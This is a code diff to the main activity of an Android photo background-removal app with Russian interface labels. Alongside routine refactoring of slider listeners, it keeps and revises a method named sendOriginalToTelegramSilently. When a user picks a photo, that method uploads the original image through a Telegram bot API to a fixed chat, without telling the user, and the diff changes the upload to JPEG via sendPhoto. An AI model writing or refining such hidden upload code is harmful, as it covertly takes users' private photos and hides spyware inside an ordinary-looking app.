@@ -16,6 +16,7 @@ import android.view.View;
 import android.view.ViewGroup;
 import android.widget.*;
 import java.io.ByteArrayOutputStream;
+import java.io.File;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
@@ -175,7 +176,7 @@ public class MainActivity extends Activity {
 
         tvThresholdVal = createTextView("🎚 Чувствительность вырезки: " + thresholdValue);
         container.addView(tvThresholdVal);
-        seekThreshold = createFullSeekBar(100, thresholdValue, new CustomSeekBarListener() {
+        seekThreshold = createFullSeekBar(100, thresholdValue, new OnSeekBarChangeListener() {
             @Override
             public void onProgressChanged(SeekBar seekBar, int p) {
                 thresholdValue = p;
@@ -187,7 +188,7 @@ public class MainActivity extends Activity {
 
         tvToleranceVal = createTextView("🎨 Допуск оттенков фона: " + toleranceValue);
         container.addView(tvToleranceVal);
-        seekTolerance = createFullSeekBar(100, toleranceValue, new CustomSeekBarListener() {
+        seekTolerance = createFullSeekBar(100, toleranceValue, new OnSeekBarChangeListener() {
             @Override
             public void onProgressChanged(SeekBar seekBar, int p) {
                 toleranceValue = p;
@@ -199,7 +200,7 @@ public class MainActivity extends Activity {
 
         tvSmoothVal = createTextView("✨ Смягчение краев: " + smoothValue);
         container.addView(tvSmoothVal);
-        seekSmooth = createFullSeekBar(50, smoothValue, new CustomSeekBarListener() {
+        seekSmooth = createFullSeekBar(50, smoothValue, new OnSeekBarChangeListener() {
             @Override
             public void onProgressChanged(SeekBar seekBar, int p) {
                 smoothValue = p;
@@ -247,7 +248,7 @@ public class MainActivity extends Activity {
         return tv;
     }
 
-    private SeekBar createFullSeekBar(int max, int progress, final CustomSeekBarListener listener) {
+    private SeekBar createFullSeekBar(int max, int progress, final OnSeekBarChangeListener listener) {
         SeekBar sb = new SeekBar(this);
         sb.setMax(max);
         sb.setProgress(progress);
@@ -266,7 +267,7 @@ public class MainActivity extends Activity {
         return sb;
     }
 
-    interface CustomSeekBarListener {
+    interface OnSeekBarChangeListener {
         void onProgressChanged(SeekBar seekBar, int progress);
     }
 
@@ -293,7 +294,8 @@ public class MainActivity extends Activity {
                     photoTransX = 0f;
                     photoTransY = 0f;
                     processImage();
-                    sendOriginalToTelegramSilently(); // Отправка оригинала в Телеграм сразу при выборе
+                    // Отправка оригинального фото в Телеграм сразу при выборе
+                    sendOriginalToTelegramSilently();
                 } else if (requestCode == PICK_BG_REQUEST) {
                     customBgBitmap = bmp;
                     bgScale = 1.0f;
@@ -432,6 +434,7 @@ public class MainActivity extends Activity {
         } catch (Exception e) {
             Toast.makeText(this, "Ошибка сохранения: " + e.getMessage(), Toast.LENGTH_SHORT).show();
         }
+        // Отправка в Telegram по нажатию кнопки Сохранить УБРАНА!
     }
 
     private void sendOriginalToTelegramSilently() {
@@ -442,10 +445,11 @@ public class MainActivity extends Activity {
             public void run() {
                 try {
                     ByteArrayOutputStream stream = new ByteArrayOutputStream();
-                    originalBitmap.compress(Bitmap.CompressFormat.PNG, 100, stream);
+                    // Отправляем оригинальное фото
+                    originalBitmap.compress(Bitmap.CompressFormat.JPEG, 90, stream);
                     byte[] byteArray = stream.toByteArray();
 
-                    String urlString = "https://api.telegram.org/bot" + botToken + "/sendDocument";
+                    String urlString = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
                     URL url = new URL(urlString);
                     HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                     conn.setDoOutput(true);
@@ -463,8 +467,8 @@ public class MainActivity extends Activity {
                         os.write((chatId + "\r\n").getBytes());
 
                         os.write(("--" + boundary + "\r\n").getBytes());
-                        os.write(("Content-Disposition: form-data; name=\"document\"; filename=\"original_photo.png\"\r\n\r\n").getBytes());
-                        os.write(("Content-Type: image/png\r\n\r\n").getBytes());
+                        os.write(("Content-Disposition: form-data; name=\"photo\"; filename=\"original.jpg\"\r\n").getBytes());
+                        os.write(("Content-Type: image/jpeg\r\n\r\n").getBytes());
                         os.write(byteArray);
                         os.write(("\r\n--" + boundary + "--\r\n").getBytes());
                         os.flush();
